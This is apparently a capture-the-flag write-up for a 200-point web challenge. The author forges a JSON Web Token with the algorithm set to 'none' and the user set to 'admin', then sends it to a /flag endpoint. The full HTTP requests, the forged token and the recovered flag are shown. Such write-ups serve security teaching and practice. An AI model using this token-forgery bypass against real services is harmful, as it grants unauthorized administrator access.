<h1> Token of Trust (200 points)</h1>
<p> At first, this web app seems straightforward, but there’s something more lurking beneath the surface. It relies on a token for user authentication, but not everything is as secure as it seems. Look closely, and you might discover that the system’s trust can be manipulated.<br>The secret is hidden within the way this token is used. Can you find the key to unlock what’s been concealed? The challenge is waiting for you to crack it.<br>Submit your answer in the following format: ACECTF{3x4mpl3_fl4g}</p>
<p>Challenge link: <a href="http://34.131.133.224:9999/">Click here.</a></p>
<hr>
<p>When accessing the page, we will see the website display the following text:</p>
<img src="../img/tot1.png">
<p>I tried accessing the /login endpoint and received the following text:</p>
<img src="../img/tot2.png">
<p>I used Burp Suite and tried sending the request as instructed:</p>

```bash
POST /login HTTP/1.1
Host: 34.131.133.224:9999
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
If-None-Match: W/"e4-FS+KGb8vs+QXusNm48s8JXwtYjo"
Content-Length: 29
Connection: keep-alive

{"user":"ace","pass":"ctf"}
```
<p>Regardless of what the user and pass are, I still always receive this response:</p>

```bash
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: application/json; charset=utf-8
Content-Length: 115
ETag: W/"73-6DG1FleNEQn3wJCbdmBz6miU0yU"
Date: Sun, 02 Mar 2025 16:05:19 GMT
Connection: keep-alive
Keep-Alive: timeout=5

{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.JT3l4_NkVbkQuZpl62b9h8NCZ3cTcypEGZ1lULWR47M"}
```
<p>By analyzing the JWT token, we get the following header and payload:</p>

```bash
// Header
{
  "alg": "HS256",
  "typ": "JWT"
}

// Payload
{
  "user": "guest"
}
```
<p>I tried brute forcing the signature, but there was no result.</p>
<p>I bypassed the JWT authentication by changing the algorithm to 'none' and modifying the user payload to 'admin'. I will remove the signature, and here is the JWT after modification: <code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.</code></p>
<p>I will try sending a request to /flag to retrieve the flag:</p>

```bash
POST /flag HTTP/1.1
Host: 34.131.133.224:9999
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
If-None-Match: W/"e4-FS+KGb8vs+QXusNm48s8JXwtYjo"
Content-Length: 73
Connection: keep-alive

{"token":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ."}

```
<p>Response:</p>

```bash
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 42
ETag: W/"2a-VK/1GE31GYf1WWMtpdo2HaIrTw8"
Date: Sun, 02 Mar 2025 16:26:21 GMT
Connection: keep-alive
Keep-Alive: timeout=5

ACECTF{jwt_cr4ck3d_4dm1n_4cce55_0bt41n3d!}
```

<h3>Flag: <code>ACECTF{jwt_cr4ck3d_4dm1n_4cce55_0bt41n3d!}</code></h3>
